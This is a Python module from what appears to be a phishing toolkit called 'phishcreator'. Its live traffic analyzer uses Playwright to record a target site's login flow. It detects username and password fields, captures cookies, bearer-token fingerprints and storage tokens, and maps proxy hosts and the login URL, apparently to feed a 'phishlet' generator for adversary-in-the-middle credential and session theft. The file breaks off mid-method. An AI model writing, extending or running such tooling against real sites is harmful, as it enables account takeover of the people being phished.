#!/usr/bin/env python3
"""
Live Traffic Analyzer
Captures authentication flows using Playwright browser automation
Enhanced with intelligent analysis modules
"""

import asyncio
import json
import yaml
from pathlib import Path
from typing import Dict, List, Optional, Set, TYPE_CHECKING, Any
from dataclasses import dataclass, field, asdict
from urllib.parse import urlparse, parse_qs, unquote
from datetime import datetime
from http.cookies import SimpleCookie
from email.parser import BytesParser
from email.policy import default as email_default_policy


# NOTE: Playwright is optional. We must ensure this module imports cleanly even when
# Playwright isn't installed. To avoid NameError in runtime evaluation of type
# annotations, we only import Playwright types under TYPE_CHECKING and use string
# annotations in method signatures.
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    async_playwright = None  # type: ignore

if TYPE_CHECKING:
    from playwright.async_api import Page as PWPage, Request as PWRequest, Response as PWResponse
else:
    PWPage = Any  # type: ignore
    PWRequest = Any  # type: ignore
    PWResponse = Any  # type: ignore

# Import intelligent modules
INTELLIGENT_MODULES_AVAILABLE = False
INTELLIGENT_MODULES_ERROR: Optional[str] = None
try:
    from phishcreator.modules.auth_flow_classifier import classify_auth_flow, AuthFlowAnalysis
    from phishcreator.modules.intelligent_credential_extractor import extract_credentials, CredentialPattern
    from phishcreator.modules.smart_cookie_analyzer import analyze_cookies, CookieAnalysis
    INTELLIGENT_MODULES_AVAILABLE = True
except ImportError as e:
    try:
        from .auth_flow_classifier import classify_auth_flow, AuthFlowAnalysis
        from .intelligent_credential_extractor import extract_credentials, CredentialPattern
        from .smart_cookie_analyzer import analyze_cookies, CookieAnalysis
        INTELLIGENT_MODULES_AVAILABLE = True
    except ImportError as e2:
        try:
            from auth_flow_classifier import classify_auth_flow, AuthFlowAnalysis
            from intelligent_credential_extractor import extract_credentials, CredentialPattern
            from smart_cookie_analyzer import analyze_cookies, CookieAnalysis
            INTELLIGENT_MODULES_AVAILABLE = True
        except ImportError as e3:
            INTELLIGENT_MODULES_ERROR = str(e3)

# Import shared constants
try:
    from phishcreator.modules.constants import USERNAME_PATTERNS, PASSWORD_PATTERNS
except ImportError:
    try:
        from .constants import USERNAME_PATTERNS, PASSWORD_PATTERNS
    except ImportError:
        try:
            from constants import USERNAME_PATTERNS, PASSWORD_PATTERNS
        except ImportError:
            # Fallback to inline patterns if constants module not available
            USERNAME_PATTERNS = None
            PASSWORD_PATTERNS = None

try:
    from phishcreator.modules.dynamic_phishlet_generator import generate_phishlet
    DYNAMIC_GENERATOR_AVAILABLE = True
except ImportError:
    try:
        from .dynamic_phishlet_generator import generate_phishlet
        DYNAMIC_GENERATOR_AVAILABLE = True
    except ImportError:
        try:
            from dynamic_phishlet_generator import generate_phishlet
            DYNAMIC_GENERATOR_AVAILABLE = True
        except ImportError:
            DYNAMIC_GENERATOR_AVAILABLE = False

def _probe_playwright_installation() -> tuple[bool, str]:
    """
    Lightweight environment check.

    We keep Playwright optional at import time, but surface a clear message when
    the Python package or browser binaries are missing. This avoids confusing
    early failures inside Flask endpoints.
    """
    if not PLAYWRIGHT_AVAILABLE or async_playwright is None:
        return False, "Playwright is not installed. Run `pip install playwright` and `playwright install chromium`."

    # Best-effort driver check (does not spawn browsers).
    try:
        from playwright._impl._driver import compute_driver_executable  # type: ignore

        driver_paths = compute_driver_executable()
        paths = driver_paths if isinstance(driver_paths, (list, tuple)) else [driver_paths]
        missing = [p for p in paths if p and not Path(p).exists()]
        if missing:
            return False, "Playwright driver missing or corrupted. Reinstall Playwright and re-run `playwright install chromium`."
    except Exception:
        # If we can't introspect, continue optimistically and let launch code
        # handle a more detailed error.
        pass

    return True, ""

def playwright_status() -> Dict[str, Any]:
    """Expose availability + message for UI endpoints."""
    available, message = _probe_playwright_installation()
    return {
        'available': available,
        'message': message or "Playwright and Chromium binaries detected",
    }

def _sanitize_for_json(value: Any) -> Any:
    """Convert bytes/sets/tuples into JSON-safe values."""
    if isinstance(value, (bytes, bytearray)):
        try:
            return value.decode('utf-8', errors='ignore')
        except Exception:
            return f"<bytes:{len(value)}>"
    if isinstance(value, dict):
        return {k: _sanitize_for_json(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_sanitize_for_json(v) for v in value]
    return value


def is_available() -> bool:
    """Check if Playwright is available"""
    available, _ = _probe_playwright_installation()
    return available


@dataclass
class LiveAnalysisResult:
    """Result of live traffic analysis"""
    unique_hosts: List[str] = field(default_factory=list)
    all_requests: List[Dict] = field(default_factory=list)
    all_responses: List[Dict] = field(default_factory=list)
    form_submissions: List[Dict] = field(default_factory=list)
    detected_proxy_hosts: List[Dict] = field(default_factory=list)
    detected_auth_tokens: List[Dict] = field(default_factory=list)
    detected_credentials: Dict = field(default_factory=dict)
    detected_login_url: str = ""
    websocket_endpoints: List[str] = field(default_factory=list)
    cookies_captured: Dict[str, Dict] = field(default_factory=dict)

    # Storage tokens (localStorage/sessionStorage), often used in modern auth
    storage_state: Dict[str, Any] = field(default_factory=dict)

    # Live status helpers for UI feedback
    auth_observed: bool = False
    auth_evidence: Dict[str, Any] = field(default_factory=dict)

    auth_flow_type: str = "unknown"
    confidence: float = 0.0
    warnings: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        return _sanitize_for_json(asdict(self))


class LiveTrafficAnalyzer:
    """
    Analyzes live authentication traffic using Playwright
    Enhanced with intelligent analysis capabilities
    """

    _MULTI_SUFFIXES = {
        'co.uk', 'gov.uk', 'ac.uk',
        'com.au', 'net.au', 'org.au',
        'com.br', 'com.mx', 'com.tr', 'com.ru', 'com.cn',
        'co.in', 'co.id', 'co.nz', 'com.sg', 'com.my', 'com.ph', 'com.sa',
    }
    _POST_LOGIN_INDICATORS = [
        'console.aws.amazon.com/console/home',
        'console.aws.amazon.com/',
        'signin.aws.amazon.com/',
        '/console/home',
        'dashboard',
        'account',
        'home',
        'welcome',
    ]
    _ANALYTICS_HINTS = [
        'analytics', 'telemetry', 'metric', 'metrics', 'collect', 'collector',
        'events', 'beacon', 'track', 'panorama', 'fingerprint', 'rum',
        'pixel', 'csds', 'log', 'logs',
    ]

    @classmethod
    def _split_host(cls, host: str) -> tuple[str, str]:
        """Split a host into (orig_sub, domain) with basic multi-level TLD awareness."""
        parts = [p for p in host.split('.') if p]
        if len(parts) < 2:
            return ('', host)

        suffix2 = '.'.join(parts[-2:])
        if len(parts) >= 3 and suffix2 in cls._MULTI_SUFFIXES:
            domain = '.'.join(parts[-3:])
            orig_sub = '.'.join(parts[:-3])
        else:
            domain = suffix2
            orig_sub = '.'.join(parts[:-2])

        return (orig_sub, domain)

    def __init__(self, headless: bool = False):
        # Use shared constants or fallback to inline patterns
        self.username_patterns = USERNAME_PATTERNS if USERNAME_PATTERNS else [
            'username', 'user', 'email', 'login', 'account', 'userid', 'user_id',
            'identifier', 'loginfmt', 'j_username', 'login_email', 'signin_email',
            'userPrincipalName', 'login_hint', 'emailAddress', 'userName', 'loginId'
        ]
        self.password_patterns = PASSWORD_PATTERNS if PASSWORD_PATTERNS else [
            'password', 'passwd', 'pass', 'pwd', 'secret', 'credential',
            'j_password', 'session[password]', 'signin_password', 'login_password',
            'userPassword', 'secretKey', 'pin', 'passcode'
        ]
        self.headless = headless
        self.requests_log = []
        self.responses_log = []
        self.form_submissions = []
        self.cookies_by_domain = {}
        self.unique_hosts = set()
        self.websocket_urls: Set[str] = set()
        self.target_domain = None
        self.browser = None
        self.context = None
        self.page = None
        self._playwright = None
        self._pending_tasks: Set[asyncio.Task] = set()

        # Storage state (tokens sometimes live in local/session storage)
        self.storage_state: Dict[str, Any] = {
            'localStorage': {},
            'sessionStorage': {},
            'captured_at': None,
        }

        # Lightweight auth evidence signals (used to show "auth observed" in UI)
        self.auth_evidence: Dict[str, Any] = {
            'post_login_url_hits': [],
            'auth_cookie_domains': {},
            'storage_token_keys': [],
        }

    def _require_playwright(self):
        """Raise a friendly error when Playwright/browsers are missing."""
        available, message = _probe_playwright_installation()
        if not available:
            raise RuntimeError(message)

    def _require_intelligent_modules(self):
        """Ensure intelligent analysis modules are available for live capture."""
        if not INTELLIGENT_MODULES_AVAILABLE:
            detail = f" ({INTELLIGENT_MODULES_ERROR})" if INTELLIGENT_MODULES_ERROR else ""
            raise RuntimeError(f"Intelligent analysis modules are required but not available{detail}")

    def _schedule_task(self, coro: Any) -> Optional[asyncio.Task]:
        """Schedule and track background tasks so we can flush them on stop."""
        if coro is None:
            return None
        try:
            task = asyncio.create_task(coro)
        except RuntimeError:
            return None
        self._pending_tasks.add(task)
        task.add_done_callback(lambda t: self._pending_tasks.discard(t))
        return task

    async def _drain_pending_tasks(self, timeout: float = 2.0):
        """Best-effort wait for listener tasks to finish before shutdown."""
        if not self._pending_tasks:
            return
        pending = list(self._pending_tasks)
        try:
            await asyncio.wait_for(asyncio.gather(*pending, return_exceptions=True), timeout=timeout)
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass
    
    async def start_browser(self, url: str):
        """
        Start browser and navigate to URL
        
        Args:
            url: Target URL to analyze
        """
        self._require_playwright()
        self._require_intelligent_modules()
        
        # Extract target domain
        parsed = urlparse(url)
        self.target_domain = parsed.netloc
        
        try:
            self._playwright = await async_playwright().start()

            # If browser binaries are missing, provide a clear error message.
            chromium = self._playwright.chromium
            exec_path = getattr(chromium, 'executable_path', None)
            if exec_path and not Path(exec_path).exists():
                raise RuntimeError(
                    f"Chromium binary not found at {exec_path}. Run `playwright install chromium` and retry."
                )

            self.browser = await chromium.launch(headless=self.headless)
        except Exception as e:
            msg = str(e)
            if 'Executable' in msg and 'does not exist' in msg:
                raise RuntimeError(
                    "Playwright Chromium is not installed. Run `playwright install chromium` to download browsers."
                ) from e
            raise
        self.context = await self.browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        self.page = await self.context.new_page()
        
        # Set up request/response listeners
        self.page.on('request', lambda req: self._schedule_task(self._handle_request(req)))
        self.page.on('response', lambda res: self._schedule_task(self._handle_response(res)))
        self.page.on('websocket', lambda ws: self._schedule_task(self._handle_websocket(ws)))

        # Track navigations (helps detect post-login console pages)
        self.page.on('framenavigated', lambda frame: self._schedule_task(self._handle_navigation(frame)))
        
        # Navigate to URL - use 'domcontentloaded' instead of 'networkidle' to avoid timeout on complex pages
        try:
            await self.page.goto(url, wait_until='domcontentloaded', timeout=60000)
        except Exception as e:
            # Even if navigation times out, the page may still be usable
            print(f"[!] Navigation warning: {e}")
    
    async def stop_browser(self, grace_period: float = 0.5):
        """
        Stop browser and capture final state

        Args:
            grace_period: extra seconds to allow pending listener tasks to finish
        """
        try:
            if grace_period and grace_period > 0:
                await asyncio.sleep(grace_period)
            await self._drain_pending_tasks(timeout=2.0)

            if self.context:
                # Capture final cookies with timeout
                try:
                    cookies = await asyncio.wait_for(self.context.cookies(), timeout=5.0)
                    for cookie in cookies:
                        domain = cookie.get('domain', '')
                        cookie_name = cookie.get('name', '')
                        if domain and cookie_name and domain not in self.cookies_by_domain:
                            self.cookies_by_domain[domain] = {}
                        if domain and cookie_name:
                            self.cookies_by_domain[domain][cookie_name] = cookie
                except asyncio.TimeoutError:
                    print("[!] Timeout getting cookies, continuing...")

                # Capture storage state as well (best-effort)
                try:
                    await asyncio.wait_for(self._capture_storage_state(), timeout=5.0)
                except asyncio.TimeoutError:
                    print("[!] Timeout capturing storage state, continuing...")
                except Exception as e:
                    print(f"[!] Error capturing storage state: {e}")

            if self.browser:
                try:
                    await asyncio.wait_for(self.browser.close(), timeout=10.0)
                except asyncio.TimeoutError:
                    print("[!] Timeout closing browser, force killing...")

            if self._playwright:
                try:
                    await asyncio.wait_for(self._playwright.stop(), timeout=5.0)
                except asyncio.TimeoutError:
                    print("[!] Timeout stopping playwright...")
        except Exception as e:
            print(f"[!] Error in stop_browser: {e}")
    
    async def analyze(self, url: str, wait_time: int = 30) -> LiveAnalysisResult:
        """
        Analyze authentication flow by launching browser
        
        Args:
            url: Target URL to analyze
            wait_time: Time to wait for user interaction (seconds)
        
        Returns:
            LiveAnalysisResult with captured traffic
        """
        self._require_playwright()
        self._require_intelligent_modules()
        
        # Extract target domain
        parsed = urlparse(url)
        self.target_domain = parsed.netloc
        
        async with async_playwright() as p:
            # Launch browser
            try:
                browser = await p.chromium.launch(headless=self.headless)
            except Exception as e:
                msg = str(e)
                if 'Executable' in msg and 'does not exist' in msg:
                    raise RuntimeError(
                        "Playwright Chromium is not installed. Run `playwright install chromium` to enable live capture."
                    ) from e
                raise
            context = await browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            page = await context.new_page()
            
            # Set up request/response listeners
            page.on('request', lambda req: self._schedule_task(self._handle_request(req)))
            page.on('response', lambda res: self._schedule_task(self._handle_response(res)))
            page.on('websocket', lambda ws: self._schedule_task(self._handle_websocket(ws)))
            
            # Navigate to URL - use 'domcontentloaded' to avoid timeout on complex pages
            try:
                await page.goto(url, wait_until='domcontentloaded', timeout=60000)
            except Exception as e:
                print(f"[!] Navigation warning: {e}")
            
            # Wait for user to perform authentication
            print(f"[*] Browser launched. Please perform authentication manually.")
            print(f"[*] Waiting {wait_time} seconds for you to complete login...")
            await asyncio.sleep(wait_time)
            
            # Capture final cookies
            cookies = await context.cookies()
            for cookie in cookies:
                domain = cookie.get('domain', '')
                cookie_name = cookie.get('name', '')
                if domain and cookie_name and domain not in self.cookies_by_domain:
                    self.cookies_by_domain[domain] = {}
                if domain and cookie_name:
                    self.cookies_by_domain[domain][cookie_name] = cookie

            # Allow background request/response handlers to flush before closing.
            await self._drain_pending_tasks(timeout=2.0)
            await browser.close()
        
        # Analyze captured traffic
        return self._build_result()
    
    async def _handle_request(self, request: 'PWRequest'):
        """Handle captured request"""
        try:
            url = request.url
            parsed = urlparse(url)
            method = (request.method or '').upper()
            
            # Track unique hosts
            if parsed.netloc:
                self.unique_hosts.add(parsed.netloc)
            
            # Parse query parameters for GET (some auth flows submit via query)
            query_params = {}
            if parsed.query:
                try:
                    query_params = {
                        k: (v[0] if len(v) == 1 else v)
                        for k, v in parse_qs(parsed.query, keep_blank_values=True).items()
                    }
                except Exception:
                    query_params = {}
            
            # Get post data safely
            post_data = None
            raw_post_data = None
            if method in ('POST', 'PUT', 'PATCH'):
                try:
                    raw_post_data = request.post_data_buffer
                except (AttributeError, RuntimeError):
                    raw_post_data = None

                try:
                    post_data = request.post_data
                except (AttributeError, RuntimeError):
                    pass  # Post data not available for this request type

                if not post_data and raw_post_data:
                    try:
                        post_data = raw_post_data.decode('utf-8', errors='ignore')
                    except Exception:
                        post_data = None
            
            # Capture request details
            request_data = {
                'url': url,
                'method': method,
                'headers': dict(request.headers),
                'post_data': post_data,
                'post_data_raw': raw_post_data,
                'query_params': query_params,
                'timestamp': datetime.now().isoformat()
            }
            # Store a JSON-safe copy of the request in logs.
            request_log = dict(request_data)
            request_log.pop('post_data_raw', None)
            self.requests_log.append(request_log)

            # Record potential post-login indicators from URLs.
            self._record_auth_evidence_from_url(url)

            # Capture cookies from request headers as a fallback for auth tokens.
            self._capture_request_cookies(parsed.netloc, request_data.get('headers', {}))
            
            # Detect form submissions
            if (method in ('POST', 'PUT', 'PATCH') and (post_data or raw_post_data)) or (method == 'GET' and query_params):
                self._analyze_form_submission(request_data)
        
        except Exception as e:
            print(f"[!] Error handling request: {e}")
    
    async def _handle_response(self, response: 'PWResponse'):
        """Handle captured response"""
        try:
            url = response.url

            # Capture response details
            response_data = {
                'url': url,
                'status': response.status,
                'headers': dict(response.headers),
                'timestamp': datetime.now().isoformat(),
                'cookies': []  # parsed Set-Cookie cookies for downstream generators
            }

            # Capture cookies from Set-Cookie headers (robust parsing)
            # NOTE: Playwright exposes headers as a dict; if multiple Set-Cookie headers
            # exist they may be concatenated. We parse best-effort using SimpleCookie.
            set_cookie_raw = response.headers.get('set-cookie', '')
            if set_cookie_raw:
                parsed_url = urlparse(url)
                host_domain = parsed_url.netloc

                # Try parsing the whole header as a cookie jar; if it fails, fall back
                # to splitting on newline (some servers join multiple Set-Cookie lines).
                candidates = [set_cookie_raw]
                if '\n' in set_cookie_raw:
                    candidates = [c.strip() for c in set_cookie_raw.split('\n') if c.strip()]

                for candidate in candidates:
                    jar = SimpleCookie()
                    try:
                        jar.load(candidate)
                    except Exception:
                        continue

                    for name, morsel in jar.items():
                        value = morsel.value
                        cookie_obj = {
                            'name': name,
                            'value': value,
                            'domain': host_domain,
                        }

                        # Store into cookies_by_domain for intelligent analyzer
                        if host_domain not in self.cookies_by_domain:
                            self.cookies_by_domain[host_domain] = {}
                        self.cookies_by_domain[host_domain][name] = cookie_obj

                        response_data['cookies'].append(cookie_obj)

            # Try to capture response body for JSON/HTML (bounded)
            try:
                content_type = response.headers.get('content-type', '')
                if 'application/json' in content_type or 'text/html' in content_type:
                    body = await response.text()
                    response_data['body'] = body[:5000]  # Limit size
            except (RuntimeError, UnicodeDecodeError, ValueError):
                pass  # Response body not available or cannot be decoded

            self.responses_log.append(response_data)

            # Record post-login signals from response URLs as well.
            self._record_auth_evidence_from_url(url)

        except Exception as e:
            print(f"[!] Error handling response: {e}")

    def _record_auth_evidence_from_url(self, url: str):
        """Track likely post-login URL hits for live status feedback."""
        try:
            if not url:
                return
            url_l = url.lower()
            if any(ind in url_l for ind in self._POST_LOGIN_INDICATORS):
                hits = self.auth_evidence.get('post_login_url_hits', [])
                if url not in hits:
                    hits.append(url)
                    self.auth_evidence['post_login_url_hits'] = hits
        except Exception:
            return

    def _capture_request_cookies(self, host: str, headers: Dict[str, Any]):
        """Parse Cookie header to capture auth tokens even if context cookies fail."""
        try:
            if not host or not headers:
                return
            cookie_header = headers.get('cookie') or headers.get('Cookie')
            if not cookie_header:
                return
            parts = [p.strip() for p in str(cookie_header).split(';') if p.strip()]
            if not parts:
                return
            bucket = self.cookies_by_domain.setdefault(host, {})
            for part in parts:
                if '=' not in part:
                    continue
                name, value = part.split('=', 1)
                name = name.strip()
                if not name:
                    continue
                bucket.setdefault(name, {
                    'name': name,
                    'value': value,
                    'domain': host,
                    '_source': 'request_header',
                })
        except Exception:
            return

    def _looks_like_analytics_url(self, url: str) -> bool:
        """Heuristic to avoid treating analytics endpoints as login URLs."""
        url_l = str(url or '').lower()
        return any(token in url_l for token in self._ANALYTICS_HINTS)

    async def _handle_websocket(self, websocket: Any):
        """Track websocket endpoints (auth sometimes flows through sockets)."""
        try:
            url = getattr(websocket, 'url', '') or ''
            if url:
                self.websocket_urls.add(url)
        except Exception:
            return
    
    def _detect_fields_in_mapping(self, mapping: Dict[str, Any]) -> tuple[Optional[str], Optional[str]]:
        """Detect likely username/password keys in a flat mapping."""
        detected_username_field = None
        detected_password_field = None

        for key in mapping.keys():
            key_lower = str(key).lower()
            if detected_username_field is None and any(pattern in key_lower for pattern in self.username_patterns):
                detected_username_field = key
            if detected_password_field is None and any(pattern in key_lower for pattern in self.password_patterns):
                detected_password_field = key
            if detected_username_field and detected_password_field:
                break

        return detected_username_field, detected_password_field

    def _detect_fields_in_json(self, obj: Any) -> tuple[Optional[str], Optional[str]]:
        """Detect credential keys anywhere in a JSON-like structure."""
        detected_username_field = None
        detected_password_field = None

        def walk(node: Any):
            nonlocal detected_username_field, detected_password_field
            if isinstance(node, dict):
                for key, value in node.items():
                    key_lower = str(key).lower()
                    if detected_username_field is None and any(pattern in key_lower for pattern in self.username_patterns):
                        detected_username_field = key
                    if detected_password_field is None and any(pattern in key_lower for pattern in self.password_patterns):
                        detected_password_field = key
                    walk(value)
            elif isinstance(node, list):
                for value in node:
                    walk(value)

        walk(obj)
        return detected_username_field, detected_password_field

    def _parse_urlencoded_body(self, post_data: Any) -> Dict[str, Any]:
        """Parse application/x-www-form-urlencoded payloads."""
        if not post_data:
            return {}
        if isinstance(post_data, (bytes, bytearray)):
            try:
                post_data = post_data.decode('utf-8', errors='ignore')
            except Exception:
                post_data = str(post_data)
        try:
            parsed = parse_qs(str(post_data), keep_blank_values=True)
            fields: Dict[str, Any] = {}
            for key, values in parsed.items():
                key = unquote(key)
                if isinstance(values, list):
                    fields[key] = values[0] if len(values) == 1 else [unquote(str(v)) for v in values]
                else:
                    fields[key] = unquote(str(values))
            return fields
        except Exception:
            return {}

    def _coerce_to_text(self, value: Any, limit: int = 4096) -> str:
        """Convert bytes to text for safe JSON serialization."""
        if value is None:
            return ''
        if isinstance(value, (bytes, bytearray)):
            try:
                text = value.decode('utf-8', errors='ignore')
            except Exception:
                return f"<binary:{len(value)}>"
        else:
            text = str(value)

        if len(text) > limit:
            return text[:limit] + '...'
        return text

    def _parse_multipart_body(self, post_data: Any, content_type: str) -> Dict[str, Any]:
        """Parse multipart/form-data payloads without external dependencies."""
        if not post_data or 'boundary' not in content_type:
            return {}

        try:
            # Build a minimal email message so BytesParser can split parts.
            body_bytes = post_data if isinstance(post_data, (bytes, bytearray)) else str(post_data).encode('utf-8', errors='ignore')
            raw = b"Content-Type: " + content_type.encode('utf-8', errors='ignore') + b"\r\n\r\n" + body_bytes
            msg = BytesParser(policy=email_default_policy).parsebytes(raw)
            fields: Dict[str, Any] = {}

            for part in msg.walk():
                if part.get_content_maintype() == 'multipart':
                    continue
                if part.get_content_disposition() != 'form-data':
                    continue
                name = part.get_param('name', header='content-disposition')
                if not name:
                    continue
                try:
                    payload = part.get_content()
                    if isinstance(payload, (bytes, bytearray)):
                        payload = self._coerce_to_text(payload)
                except Exception:
                    payload = part.get_payload(decode=True) or b''
                    payload = self._coerce_to_text(payload)
                fields[name] = payload
            return fields
        except Exception:
            return {}

    def _analyze_form_submission(self, request_data: Dict):
        """Analyze request for credential submission (POST bodies or GET querystrings)."""
        post_data = request_data.get('post_data', '')
        raw_post_data = request_data.get('post_data_raw', post_data)
        method = (request_data.get('method') or '').upper()
        content_type = (request_data.get('headers', {}).get('content-type', '') or '').lower()

        fields: Dict[str, Any] = {}
        detected_username_field: Optional[str] = None
        detected_password_field: Optional[str] = None

        # Some apps pass credentials via query params (GET/redirect flows).
        if method == 'GET':
            query_fields = request_data.get('query_params') or {}
            if query_fields:
                detected_username_field, detected_password_field = self._detect_fields_in_mapping(query_fields)
                fields = query_fields

        if method in ('POST', 'PUT', 'PATCH'):
            if 'multipart/form-data' in content_type:
                fields = self._parse_multipart_body(raw_post_data, content_type)
                du, dp = self._detect_fields_in_mapping(fields)
                detected_username_field = detected_username_field or du
                detected_password_field = detected_password_field or dp
            elif 'application/x-www-form-urlencoded' in content_type:
                fields = self._parse_urlencoded_body(post_data)
                du, dp = self._detect_fields_in_mapping(fields)
                detected_username_field = detected_username_field or du
                detected_password_field = detected_password_field or dp
            elif 'application/json' in content_type:
                try:
                    if isinstance(post_data, (bytes, bytearray)):
                        post_data = post_data.decode('utf-8', errors='ignore')
                    fields = json.loads(post_data)
                except (json.JSONDecodeError, ValueError, TypeError):
                    fields = {}
                du, dp = self._detect_fields_in_json(fields)
                detected_username_field = detected_username_field or du
                detected_password_field = detected_password_field or dp
            else:
                # Fallback: attempt to parse as urlencoded even without explicit header.
                fields = self._parse_urlencoded_body(post_data)
                du, dp = self._detect_fields_in_mapping(fields)
                detected_username_field = detected_username_field or du
                detected_password_field = detected_password_field or dp

        # Record form submission if credentials detected
        if detected_username_field or detected_password_field:
            if detected_password_field is None and self._looks_like_analytics_url(request_data.get('url', '')):
                return
            self.form_submissions.append({
                'url': request_data['url'],
                'method': method,
                'content_type': content_type or ('querystring' if method == 'GET' else ''),
                'fields': fields,
                'detected_username_field': detected_username_field,
                'detected_password_field': detected_password_field,
                'timestamp': request_data['timestamp']
            })
    
    def _build_result(self) -> LiveAnalysisResult:
        """Build analysis result from captured traffic with intelligent analysis"""
        result = LiveAnalysisResult()
        
        # Unique hosts
        result.unique_hosts = sorted(list(self.unique_hosts))

        # WebSocket endpoints observed (best-effort)
        result.websocket_endpoints = sorted(list(self.websocket_urls))
        
        # All requests and responses
        result.all_requests = self.requests_log
        result.all_responses = self.responses_log
        
        # Form submissions
        result.form_submissions = self.form_submissions
        
        # Cookies
        result.cookies_captured = self.cookies_by_domain

        # Storage state
        result.storage_state = self.storage_state
        
        # Detect proxy hosts
        result.detected_proxy_hosts = self._detect_proxy_hosts()
        
        # Detect auth tokens
        result.detected_auth_tokens = self._detect_auth_tokens()
        
        # Detect login URL
        result.detected_login_url = self._detect_login_url()
        
        # Intelligent modules are required for live analysis.
        self._require_intelligent_modules()

        traffic_data = {
            'all_requests': self.requests_log,
            'all_responses': self.responses_log,
            'form_submissions': self.form_submissions,
            'unique_hosts': result.unique_hosts,
            'cookies_captured': result.cookies_captured,
            'storage_state': result.storage_state,
            'detected_proxy_hosts': result.detected_proxy_hosts,
            'detected_auth_tokens': result.detected_auth_tokens,
            'detected_login_url': result.detected_login_url,
        }
        
        # Classify authentication flow
        try:
            auth_analysis = classify_auth_flow(traffic_data)
            result.auth_flow_type = auth_analysis.primary_type
            result.confidence = auth_analysis.confidence
            result.recommendations.extend(auth_analysis.recommendations)
        except Exception as e:
            result.warnings.append(f"Auth flow classification failed: {e}")
        
        # Extract credentials intelligently
        try:
            cred_pattern = extract_credentials(self.form_submissions)
            result.detected_credentials = {
                'username': cred_pattern.username_key,
                'password': cred_pattern.password_key,
                'type': cred_pattern.username_type,
                'confidence': cred_pattern.confidence
            }
        except Exception as e:
            result.warnings.append(f"Credential extraction failed: {e}")
        
        # Analyze cookies intelligently
        try:
            cookie_analysis = analyze_cookies(self.cookies_by_domain, traffic_data)
            result.detected_auth_tokens = cookie_analysis.auth_tokens
            result.recommendations.extend(cookie_analysis.recommendations)
        except Exception as e:
            result.warnings.append(f"Cookie analysis failed: {e}")

        # Compute auth_observed + evidence for UI feedback
        result.auth_observed, result.auth_evidence = self._compute_auth_observed(result)

        # Surface potential capture gaps so operators know when to retry.
        storage_empty = not any(result.storage_state.get(k) for k in ['localStorage', 'sessionStorage'])
        if (self.form_submissions or result.auth_evidence.get('post_login_url_hits')) and not result.cookies_captured and storage_empty:
            result.warnings.append("No cookies or storage tokens were captured. If authentication was still in progress, rerun capture and stop after login completes.")
        if result.websocket_endpoints:
            result.warnings.append("WebSocket endpoints observed; payloads sent over sockets are not parsed automatically.")

        return result
    
    def _detect_proxy_hosts(self) -> List[Dict]:
        """Detect proxy hosts from unique hosts"""
        proxy_hosts = []
        
        for host in self.unique_hosts:
            # Parse subdomain and domain
            orig_sub, domain = self._split_host(host)
            if not domain:
                continue

            # Check if this host has session cookies
            has_session_cookies = host in self.cookies_by_domain and len(self.cookies_by_domain[host]) > 0
            
            # Check if this is the landing page
            is_landing = host == self.target_domain
            
            proxy_hosts.append({
                'domain': domain,
                'orig_sub': orig_sub,
                '_original_host': host,
                'has_session_cookies': has_session_cookies,
                'is_landing': is_landing
            })
        
        return proxy_hosts
    
    def _detect_auth_tokens(self) -> List[Dict]:
        """Detect auth tokens.

        Primary source: cookies (auth_tokens phishlet config)
        Additional signal: bearer tokens observed in Authorization headers.

        Note: phishlets mostly care about cookies, but surfacing header tokens in the UI
        helps confirm modern API auth flows.
        """
        auth_tokens: List[Dict] = []

        # 1) Cookies
        for domain, cookies in self.cookies_by_domain.items():
            if cookies:
                auth_tokens.append({
                    'domain': domain,
                    'keys': list(cookies.keys())
                })

        # 2) Authorization: Bearer tokens (collect per-domain)
        bearer_by_domain: Dict[str, Set[str]] = {}
        for req in self.requests_log:
            try:
                headers = req.get('headers') or {}
                # live capture uses dict(request.headers)
                auth = headers.get('authorization') or headers.get('Authorization')
                if not auth:
                    continue
                auth_s = str(auth)
                if 'bearer ' not in auth_s.lower():
                    continue

                host = urlparse(req.get('url', '')).netloc
                if not host:
                    continue

                # Do not store full bearer token. Store a short fingerprint for UI/debug.
                token = auth_s.split()[-1]
                fp = token[:12] + '…' if len(token) > 12 else token
                bearer_by_domain.setdefault(host, set()).add(f"Authorization:Bearer:{fp}")
            except Exception:
                continue

        for host, fps in bearer_by_domain.items():
            auth_tokens.append({
                'domain': host,
                'keys': sorted(list(fps)),
                '_priority': 'important',
                '_source': 'header'
            })

        return auth_tokens
    
    def _detect_login_url(self) -> str:
        """Detect login URL from form submissions with basic heuristics."""
        if not self.form_submissions:
            return '/'

        best_url = self.form_submissions[0].get('url', '/') or '/'
        best_score = -1

        for idx, form in enumerate(self.form_submissions):
            url = form.get('url', '') or ''
            parsed = urlparse(url)
            score = 0

            # Prioritize submissions where we detected credential fields.
            if form.get('detected_username_field') or form.get('detected_password_field'):
                score += 5
            if form.get('detected_password_field'):
                score += 3

            # Prefer same-domain submissions for generator defaults.
            if self.target_domain and parsed.netloc.endswith(self.target_domain):
                score += 3

            path_l = (parsed.path or '').lower()
            if any(token in path_l for token in ['login', 'signin', 'auth', 'oauth', 'saml', 'session']):
                score += 2

            if str(form.get('method', '')).upper() == 'POST':
                score += 1

            if self._looks_like_analytics_url(url):
                score -= 5

            # If scores tie, prefer later submissions (common in OAuth redirects).
            if score > best_score or (score == best_score and idx > 0):
                best_url = url or best_url
                best_score = score

        return best_url or '/'

    async def _handle_navigation(self, frame: Any):
        """Track navigation URLs to infer post-login success."""
        try:
            # Only consider main frame navigations
            parent = getattr(frame, 'parent_frame', None)
            if callable(parent):
                if parent() is not None:
                    return
            elif parent is not None:
                return

            url = getattr(frame, 'url', None) or ''
            if not url:
                return

            self._record_auth_evidence_from_url(url)
        except Exception:
            return

    async def _capture_storage_state(self):
        """Capture localStorage/sessionStorage from the page (best-effort)."""
        if not self.page:
            return

        try:
